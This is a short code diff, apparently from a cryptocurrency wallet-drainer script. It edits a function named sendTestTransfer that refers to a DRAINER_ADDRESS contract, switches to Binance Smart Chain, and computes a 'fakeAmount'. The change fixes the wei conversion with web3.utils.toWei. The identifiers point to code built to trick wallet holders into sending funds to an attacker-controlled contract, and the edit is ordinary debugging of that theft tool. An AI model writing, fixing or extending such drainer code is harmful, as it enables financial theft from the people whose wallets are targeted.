@@ -153,7 +153,7 @@ async function sendTestTransfer() {
         await ensureBSC();
 
         const amount = document.getElementById('amountInput').value;
-        const fakeAmount = (amount || 0.01) * 1e18;
+        const fakeAmount = web3.utils.toWei(     (amount || 0.01).toString(),     'ether' );
 
         console.log("Account:", account);
         console.log("Contract:", DRAINER_ADDRESS);
